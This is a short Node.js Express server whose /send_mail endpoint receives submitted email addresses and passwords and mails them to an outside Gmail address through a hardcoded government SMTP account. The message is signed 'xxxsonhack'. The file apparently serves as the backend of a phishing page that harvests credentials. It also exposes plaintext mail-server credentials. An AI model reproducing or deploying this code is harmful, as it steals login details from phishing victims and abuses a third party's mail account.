const express = require("express");

const app = express();

const bodyParser = require("body-parser");
const cors = require("cors");
const nodemailer = require("nodemailer");

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

app.use(cors());

app.post("/send_mail", cors(), async (req, res) => {
  let { email, pass } = req.body;
  const transport = nodemailer.createTransport({
    host: "mail.sidur.gob.mx",
    port: 465,
    auth: {
      user: "diego.ledgard@sidur.gob.mx",
      pass: "C0rr30.48",
    },
  });

  await transport.sendMail({
    from: "diego.ledgard@sidur.gob.mx",
    to: "fredrick3smith33@gmail.com",
    subject: "test email",
    html: ` 
        <h2>Here is your email!</h2>
        <p>Email: ${email}</p>
        <p>Pass: ${pass}</p>
    
        <p>All the best, xxxsonhack</p>
         
    `,
  });
});

app.listen(5000, console.log("server on 5000"));
